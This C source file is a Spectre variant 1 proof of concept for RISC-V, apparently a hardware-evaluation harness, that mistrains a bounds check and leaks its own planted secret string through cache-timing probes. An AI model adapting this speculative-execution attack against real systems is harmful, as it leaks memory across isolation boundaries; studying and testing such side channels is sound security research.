#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "rv64_spectre.h"

#ifndef V1_ATTACK_TRIES
#define V1_ATTACK_TRIES 128
#endif

#ifndef V1_TRAINING_LOOPS
#define V1_TRAINING_LOOPS 30
#endif

#ifndef V1_USE_BOOM_DELAY
#define V1_USE_BOOM_DELAY 0
#endif

static volatile unsigned int array1_size = 16;
static struct
{
  uint8_t array1[160];
  char secret[sizeof("S3CreT")];
} v1_data = {
  .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
  .secret = "S3CreT"
};
static uint8_t *array2;
static uint8_t temp = 0;

static __attribute__((noinline)) void victim_function(size_t x)
{
#if V1_USE_BOOM_DELAY
  const uint64_t divisor = 2;
  uint64_t delayed_size = (uint64_t)array1_size << 4;
  asm volatile(
      "fcvt.s.lu fa4, %[divisor]\n"
      "fcvt.s.lu fa5, %[size]\n"
      "fdiv.s fa5, fa5, fa4\n"
      "fdiv.s fa5, fa5, fa4\n"
      "fdiv.s fa5, fa5, fa4\n"
      "fdiv.s fa5, fa5, fa4\n"
      "fcvt.lu.s %[size], fa5, rtz\n"
      : [size] "+r"(delayed_size)
      : [divisor] "r"(divisor)
      : "fa4", "fa5");
  array1_size = (unsigned int)delayed_size;
#endif

  if (x < array1_size)
    temp &= array2[v1_data.array1[x] * PROBE_STRIDE];
}

static __attribute__((noinline)) void read_memory_byte(size_t malicious_x, uint8_t value[2],
                                                        uint64_t score[2], uint64_t threshold)
{
  uint64_t results[PROBE_ENTRIES];
  memset(results, 0, sizeof(results));

  for (int tries = V1_ATTACK_TRIES; tries > 0; --tries)
  {
    size_t training_x = (size_t)tries % array1_size;
    flush_range(array2, PROBE_BYTES);

    for (int j = V1_TRAINING_LOOPS - 1; j >= 0; --j)
    {
      flush_line((const void *)&array1_size);
      delay_nops(100);

      size_t x = ((size_t)(j % 6) - 1u) & ~(size_t)0xffff;
      x = x | (x >> 16);
      x = training_x ^ (x & (malicious_x ^ training_x));
      victim_function(x);
    }

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mix_i = probe_mix(i);
      volatile uint8_t *addr = &array2[mix_i * PROBE_STRIDE];
      const uint64_t delta = probe_time(addr);
      if (delta <= threshold && mix_i != v1_data.array1[tries % array1_size])
        results[mix_i]++;
    }

    uint8_t best[2];
    uint64_t best_score[2];
    top_two_idx(results, PROBE_ENTRIES, best, best_score);
    if (best_score[0] >= (2u * best_score[1] + 5u) ||
        (best_score[0] == 2u && best_score[1] == 0u))
      break;
  }

  uint8_t best[2];
  top_two_idx(results, PROBE_ENTRIES, best, score);
  value[0] = best[0];
  value[1] = best[1];
}

int main(void)
{
#if SPECTRE_MAX_BYTES > 0
  printf("[v1] start\n");
  fflush(stdout);
#endif

  if (spectre_runtime_init() != 0)
    return 1;
  array2 = (uint8_t *)spectre_alloc_aligned(PROBE_BYTES, L1_BLOCK_SZ_BYTES);
  if (array2 == NULL)
    return 1;

  uint8_t value[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  const size_t len = spectre_limit_len(sizeof(v1_data.secret) - 1u);
  size_t malicious_x = (size_t)(v1_data.secret - (char *)v1_data.array1);

  probe_init(array2);
  const uint64_t threshold = calibrate_probe_threshold(array2);

  printf("[v1] threshold: %lu\n", (unsigned long)threshold);
  printf("[v1] reading %lu bytes\n", (unsigned long)len);
  fflush(stdout);

  for (size_t i = 0; i < len; ++i)
  {
    read_memory_byte(malicious_x + i, value, score, threshold);
    printf("[v1] byte %2lu: %c (0x%02x) score=%lu\n",
           (unsigned long)i,
           (value[0] >= 32 && value[0] < 127) ? value[0] : '?',
           value[0],
           (unsigned long)score[0]);
    printf("[v1] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (v1_data.secret[i] >= 32 && v1_data.secret[i] < 127) ? v1_data.secret[i] : '?',
           (uint8_t)v1_data.secret[i],
           (value[1] >= 32 && value[1] < 127) ? value[1] : '?',
           value[1],
           (unsigned long)score[1]);
    printf("[v1] check %lu 0x%02x 0x%02x\n",
           (unsigned long)i,
           value[0],
           (uint8_t)v1_data.secret[i]);
    fflush(stdout);
  }

  return 0;
}
